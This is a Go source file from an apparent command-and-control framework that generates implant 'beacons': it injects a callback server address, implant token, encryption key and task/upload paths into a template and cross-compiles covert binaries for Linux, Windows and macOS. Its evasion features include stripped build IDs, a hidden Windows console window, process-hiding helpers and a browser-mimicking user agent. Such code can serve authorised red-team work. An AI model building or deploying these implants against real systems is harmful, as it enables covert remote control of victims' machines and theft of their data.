package c2

import (
	"encoding/json"
	"fmt"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"text/template"

	"github.com/google/uuid"
	"go.uber.org/zap"
)

// PayloadBuilderInput holds the input parameters for building a beacon.
type PayloadBuilderInput struct {
	ListenerID    string // l_xxx
	OS            string // linux|windows|darwin
	Arch          string // amd64|arm64|386
	SleepSeconds  int
	JitterPercent int
	OutputName    string // custom output filename (without extension); defaults to "beacon_<os>_<arch>"
	// Host: when non-empty, is used as the implant callback address (overrides listener bind_host / 0.0.0.0 auto-detection)
	Host string
}

// PayloadBuilder is responsible for generating and cross-compiling a beacon binary from templates.
type PayloadBuilder struct {
	manager   *Manager
	logger    *zap.Logger
	tmplDir   string // template directory, e.g. internal/c2/payload_templates
	outputDir string // output directory, e.g. tmp/c2/payloads
}

// NewPayloadBuilder creates a new builder.
func NewPayloadBuilder(manager *Manager, logger *zap.Logger, tmplDir, outputDir string) *PayloadBuilder {
	if tmplDir == "" {
		tmplDir = "internal/c2/payload_templates"
	}
	if outputDir == "" {
		outputDir = "tmp/c2/payloads"
	}
	return &PayloadBuilder{
		manager:   manager,
		logger:    logger,
		tmplDir:   tmplDir,
		outputDir: outputDir,
	}
}

// BuildResult holds the build output.
type BuildResult struct {
	PayloadID    string `json:"payload_id"`
	ListenerID   string `json:"listener_id"`
	OutputPath   string `json:"output_path"`
	DownloadPath string `json:"download_path"` // absolute path on disk
	OS           string `json:"os"`
	Arch         string `json:"arch"`
	SizeBytes    int64  `json:"size_bytes"`
}

// BuildBeacon cross-compiles and generates a beacon binary.
func (b *PayloadBuilder) BuildBeacon(in PayloadBuilderInput) (*BuildResult, error) {
	listener, err := b.manager.DB().GetC2Listener(in.ListenerID)
	if err != nil {
		return nil, fmt.Errorf("get listener: %w", err)
	}
	if listener == nil {
		return nil, ErrListenerNotFound
	}

	lt := strings.ToLower(listener.Type)

	cfg := &ListenerConfig{}
	if listener.ConfigJSON != "" {
		_ = parseJSON(listener.ConfigJSON, cfg)
	}
	cfg.ApplyDefaults()

	// Validate target architecture
	goos := strings.ToLower(in.OS)
	goarch := strings.ToLower(in.Arch)
	if goos == "" {
		goos = "linux"
	}
	if goarch == "" {
		goarch = "amd64"
	}

	// Template parameter: request Host > listener callback_host > bind derivation (see ResolveBeaconDialHost)
	host := ResolveBeaconDialHost(listener, in.Host, b.logger, listener.ID)
	if err := ValidateBeaconDialHost(host); err != nil {
		return nil, err
	}

	// Read template
	tmplPath := filepath.Join(b.tmplDir, "beacon.go.tmpl")
	tmplData, err := os.ReadFile(tmplPath)
	if err != nil {
		return nil, fmt.Errorf("read template: %w", err)
	}

	serverURL := fmt.Sprintf("%s://%s",
		listenerTypeToScheme(listener.Type),
		net.JoinHostPort(host, strconv.Itoa(listener.BindPort)),
	)

	transport := "http"
	tcpDialAddr := ""
	transportMeta := "http_beacon"
	switch lt {
	case "tcp_reverse":
		transport = "tcp"
		tcpDialAddr = net.JoinHostPort(host, strconv.Itoa(listener.BindPort))
		transportMeta = "tcp_beacon"
	case "https_beacon":
		transportMeta = "https_beacon"
	case "websocket":
		transportMeta = "websocket"
	}

	data := map[string]string{
		"Transport":         transport,
		"TCPDialAddr":       tcpDialAddr,
		"TransportMetadata": transportMeta,
		"ServerURL":         serverURL,
		"ImplantToken":      listener.ImplantToken,
		"AESKeyB64":         listener.EncryptionKey,
		"SleepSeconds":      fmt.Sprintf("%d", firstPositive(in.SleepSeconds, cfg.DefaultSleep, 5)),
		"JitterPercent":     fmt.Sprintf("%d", clamp(in.JitterPercent, 0, 100)),
		"CheckInPath":       cfg.BeaconCheckInPath,
		"TasksPath":         cfg.BeaconTasksPath,
		"ResultPath":        cfg.BeaconResultPath,
		"UploadPath":        cfg.BeaconUploadPath,
		"FilePath":          cfg.BeaconFilePath,
		"UserAgent":         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
	}

	// Execute template
	tmpl, err := template.New("beacon").Parse(string(tmplData))
	if err != nil {
		return nil, fmt.Errorf("parse template: %w", err)
	}

	// createworking directory
	workDir := filepath.Join(b.outputDir, "build-"+uuid.New().String()[:8])
	if err := os.MkdirAll(workDir, 0755); err != nil {
		return nil, fmt.Errorf("mkdir: %w", err)
	}
	defer os.RemoveAll(workDir) // cleanup

	srcPath := filepath.Join(workDir, "main.go")
	f, err := os.Create(srcPath)
	if err != nil {
		return nil, fmt.Errorf("create source: %w", err)
	}
	if err := tmpl.Execute(f, data); err != nil {
		f.Close()
		return nil, fmt.Errorf("execute template: %w", err)
	}
	f.Close()

	// Platform-specific helper source files (e.g. no-console-window child process)
	for _, name := range []string{"proc_hide_windows.go", "proc_hide_unix.go"} {
		helperSrc := filepath.Join(b.tmplDir, name+".tmpl")
		helperData, readErr := os.ReadFile(helperSrc)
		if readErr != nil {
			return nil, fmt.Errorf("read helper %s: %w", name, readErr)
		}
		if writeErr := os.WriteFile(filepath.Join(workDir, name), helperData, 0644); writeErr != nil {
			return nil, fmt.Errorf("write helper %s: %w", name, writeErr)
		}
	}

	// Cross-compile
	payloadID := "p_" + strings.ReplaceAll(uuid.New().String(), "-", "")[:14]
	binName := strings.TrimSpace(in.OutputName)
	if binName == "" {
		binName = fmt.Sprintf("beacon_%s_%s_%s", goos, goarch, payloadID)
	}
	if goos == "windows" && !strings.HasSuffix(binName, ".exe") {
		binName += ".exe"
	}
	binPath := filepath.Join(b.outputDir, binName)

	if err := os.MkdirAll(b.outputDir, 0755); err != nil {
		return nil, fmt.Errorf("mkdir output: %w", err)
	}

	absBinPath, err := filepath.Abs(binPath)
	if err != nil {
		return nil, fmt.Errorf("abs output path: %w", err)
	}
	ldflags := "-s -w -buildid="
	if goos == "windows" {
		// Run the beacon body without a console window
		ldflags += " -H windowsgui"
	}
	cmd := exec.Command("go", "build", "-ldflags", ldflags, "-trimpath", "-o", absBinPath, ".")
	cmd.Env = append(os.Environ(),
		"GOOS="+goos,
		"GOARCH="+goarch,
		"CGO_ENABLED=0",
	)
	cmd.Dir = workDir
	output, err := cmd.CombinedOutput()
	if err != nil {
		b.logger.Error("beacon build failed", zap.String("output", string(output)), zap.Error(err))
		return nil, fmt.Errorf("build failed: %w (output: %s)", err, string(output))
	}

	// Get file size
	info, err := os.Stat(binPath)
	if err != nil {
		return nil, fmt.Errorf("stat output: %w", err)
	}

	return &BuildResult{
		PayloadID:    payloadID,
		ListenerID:   listener.ID,
		OutputPath:   absBinPath,
		DownloadPath: absBinPath,
		OS:           goos,
		Arch:         goarch,
		SizeBytes:    info.Size(),
	}, nil
}

func listenerTypeToScheme(t string) string {
	switch strings.ToLower(t) {
	case "https_beacon":
		return "https"
	case "websocket":
		return "ws"
	case "http_beacon":
		return "http"
	default:
		return "http"
	}
}

func firstPositive(vals ...int) int {
	for _, v := range vals {
		if v > 0 {
			return v
		}
	}
	return 1
}

func clamp(v, min, max int) int {
	if v < min {
		return min
	}
	if v > max {
		return max
	}
	return v
}

// GetPayloadStoragePath returns the absolute path of the payload storage directory.
func (b *PayloadBuilder) GetPayloadStoragePath() string {
	abs, _ := filepath.Abs(b.outputDir)
	return abs
}

// GetSupportedOSArch returns the list of supported operating systems and architectures.
func GetSupportedOSArch() map[string][]string {
	return map[string][]string{
		"linux":   {"amd64", "arm64", "386", "arm"},
		"windows": {"amd64", "arm64", "386"},
		"darwin":  {"amd64", "arm64"},
	}
}

// ValidateOSArch validates whether the OS/Arch combination can be compiled.
func ValidateOSArch(os, arch string) bool {
	supported := GetSupportedOSArch()
	arches, ok := supported[strings.ToLower(os)]
	if !ok {
		return false
	}
	for _, a := range arches {
		if a == strings.ToLower(arch) {
			return true
		}
	}
	return false
}

// detectExternalIP returns the first non-loopback IPv4 address, or "" if none found.
func detectExternalIP() string {
	ifaces, err := net.Interfaces()
	if err != nil {
		return ""
	}
	for _, iface := range ifaces {
		if iface.Flags&net.FlagLoopback != 0 || iface.Flags&net.FlagUp == 0 {
			continue
		}
		addrs, err := iface.Addrs()
		if err != nil {
			continue
		}
		for _, addr := range addrs {
			ipnet, ok := addr.(*net.IPNet)
			if !ok || ipnet.IP.To4() == nil {
				continue
			}
			return ipnet.IP.String()
		}
	}
	return ""
}

func parseJSON(s string, v interface{}) error {
	if strings.TrimSpace(s) == "" || s == "{}" {
		return nil
	}
	return json.Unmarshal([]byte(s), v)
}
